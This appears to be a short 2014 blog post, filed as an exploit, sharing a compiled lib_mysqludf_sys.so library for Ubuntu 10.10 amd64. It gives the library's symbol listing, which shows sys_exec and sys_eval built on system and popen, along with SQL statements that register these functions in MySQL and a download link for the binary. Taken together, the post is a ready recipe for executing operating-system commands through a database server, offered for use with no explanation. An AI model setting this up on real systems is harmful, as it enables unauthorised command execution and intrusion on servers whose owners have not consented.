title: "ubuntu 10.10 amd64 编译的UDF"
date: 2014-01-07 19:21:30
tags:
id: 470
comment: false
categories:
  - exploit
---

<pre class="brush:cpp">root@xserver:~# nm -D lib_mysqludf_sys.so 
                 w _Jv_RegisterClasses
0000000000202078 A __bss_start
                 w __cxa_finalize
                 w __gmon_start__
                 U __stack_chk_fail
0000000000202078 A _edata
0000000000202088 A _end
0000000000001248 T _fini
0000000000000a20 T _init
                 U fgets
                 U free
                 U getenv
0000000000000c4f T lib_mysqludf_sys_info
0000000000000c45 T lib_mysqludf_sys_info_deinit
0000000000000bfc T lib_mysqludf_sys_info_init
                 U malloc
                 U memcpy
                 U pclose
                 U popen
                 U realloc
                 U setenv
                 U strlen
                 U strncpy
0000000000001063 T sys_eval
0000000000001059 T sys_eval_deinit
0000000000000ff2 T sys_eval_init
0000000000000fc3 T sys_exec
0000000000000fb9 T sys_exec_deinit
0000000000000f52 T sys_exec_init
0000000000000d02 T sys_get
0000000000000cf8 T sys_get_deinit
0000000000000c9b T sys_get_init
0000000000000e81 T sys_set
0000000000000e56 T sys_set_deinit
0000000000000d65 T sys_set_init
                 U system</pre>
<pre class="brush:sql">DROP FUNCTION IF EXISTS lib_mysqludf_sys_info;
DROP FUNCTION IF EXISTS sys_get;
DROP FUNCTION IF EXISTS sys_set;
DROP FUNCTION IF EXISTS sys_exec;
DROP FUNCTION IF EXISTS sys_eval;

CREATE FUNCTION lib_mysqludf_sys_info RETURNS string SONAME 'lib_mysqludf_sys.so';
CREATE FUNCTION sys_get RETURNS string SONAME 'lib_mysqludf_sys.so';
CREATE FUNCTION sys_set RETURNS int SONAME 'lib_mysqludf_sys.so';
CREATE FUNCTION sys_exec RETURNS int SONAME 'lib_mysqludf_sys.so';
CREATE FUNCTION sys_eval RETURNS string SONAME 'lib_mysqludf_sys.so';</pre>
[lib_mysqludf_sys](http://lpcdma.com/wp-content/uploads/2014/01/lib_mysqludf_sys.zip)

&nbsp;